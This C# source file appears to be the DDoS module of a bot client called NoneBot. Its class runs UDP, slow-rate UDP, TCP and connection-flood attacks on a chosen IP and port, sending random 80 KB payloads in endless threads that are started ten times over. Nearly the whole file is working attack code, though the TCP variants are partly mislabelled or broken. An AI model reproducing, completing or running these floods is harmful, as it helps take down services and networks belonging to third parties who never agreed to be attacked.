using NoneBot.Process;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace NoneBot.Function
{
    public class CDDoS
    {
        public struct DDoS_Options
        {
            public DDoS_Options()
            {
            }

            public bool On_L4_SYN_FLOODING_TCP = false;
            public bool On_L4_FLOODING_UDP = false;
            public bool On_L4_SLOW_RATE_ATTACK_UDP = false;
            public bool On_L4_FLOODING_TCP = false;
        }

        public static DDoS_Options ms_hOptions = new DDoS_Options();
        private static bool ms_bIsStop = false;

        public static void StartDDoS() { ms_bIsStop = false; }
        public static void StopDDoS() { ms_bIsStop = true; }

        public void Close()
        {
            ms_hOptions.On_L4_SYN_FLOODING_TCP = false;
            ms_hOptions.On_L4_FLOODING_UDP = false;
            ms_hOptions.On_L4_SLOW_RATE_ATTACK_UDP = false;
            ms_hOptions.On_L4_FLOODING_TCP = false;
        }

        public void Execute(string strTarget, int iPort)
        {
            StartDDoS();

            for (int i = 0; i < 10; i++)
            {
                if (ms_hOptions.On_L4_SYN_FLOODING_TCP == true)
                {
                    ExecSynFloodingTCP(strTarget, iPort);
                }

                if (ms_hOptions.On_L4_FLOODING_UDP == true)
                {
                    ExecFloodingUDP(strTarget, iPort);
                }

                if (ms_hOptions.On_L4_SLOW_RATE_ATTACK_UDP == true)
                {
                    ExecSlowRateAttackUDP(strTarget, iPort);
                }

                if (ms_hOptions.On_L4_FLOODING_TCP == true)
                {
                    ExecFloodingTCP(strTarget, iPort);
                }
            }

            Close();
        }

        public void ExecFloodingTCP(string strIP, int iPort)
        {
            new Thread(() =>
            {
                try
                {
                    Thread.CurrentThread.IsBackground = true;
                    Socket hSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);

                    IPAddress hServerAddress = IPAddress.Parse(strIP);
                    IPEndPoint hEndPoint = new IPEndPoint(hServerAddress, iPort);

                    hSocket.Connect(hEndPoint);

                    byte[] szSendBuffer = new byte[1024 * 80];
                    CProcess.GetRandom.NextBytes(szSendBuffer);

                    for (; ; )
                    {
                        if (ms_bIsStop)
                        {
                            break;
                        }

                        try
                        {
                            hSocket.SendTo(szSendBuffer, hEndPoint);
                        }
                        catch (Exception e)
                        {
                            // 다시 연결 시도
                            hSocket.Connect(hEndPoint);
                        }
                    }
                }
                catch (Exception e)
                {

                }
            }).Start();
        }

        public void ExecFloodingUDP(string strIP, int iPort)
        {
            new Thread(() =>
            {
                try
                {
                    Thread.CurrentThread.IsBackground = true;
                    Socket hSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                    IPAddress hServerAddress = IPAddress.Parse(strIP);
                    IPEndPoint hEndPoint = new IPEndPoint(hServerAddress, iPort);

                    byte[] szSendBuffer = new byte[1024 * 80];
                    CProcess.GetRandom.NextBytes(szSendBuffer);

                    for (; ; )
                    {
                        if (ms_bIsStop)
                        {
                            break;
                        }

                        hSocket.SendTo(szSendBuffer, hEndPoint);
                    }
                }
                catch (Exception ex)
                {

                }
            }).Start();
        }

        public void ExecSlowRateAttackUDP(string strIP, int iPort)
        {
            new Thread(() =>
            {
                try
                {
                    Thread.CurrentThread.IsBackground = true;
                    Socket hSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                    IPAddress hServerAddress = IPAddress.Parse(strIP);
                    IPEndPoint hEndPoint = new IPEndPoint(hServerAddress, iPort);

                    byte[] szSendBuffer = new byte[1024 * 80];
                    CProcess.GetRandom.NextBytes(szSendBuffer);

                    for (; ; )
                    {
                        if (ms_bIsStop)
                        {
                            break;
                        }

                        hSocket.SendTo(szSendBuffer, hEndPoint);
                        Thread.Sleep(500);
                    }
                }
                catch (Exception ex)
                {

                }
            }).Start();
        }

        public void ExecSynFloodingTCP(string strIP, int iPort)
        {
            new Thread(() =>
            {
                for (; ; )
                {
                    try
                    {
                        if (ms_bIsStop)
                        {
                            break;
                        }

                        using (Socket hSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                        {
                            hSocket.Connect(strIP, iPort);
                        };
                    }
                    catch (Exception ex)
                    {

                    }
                }
            }).Start();
        }
    }
}
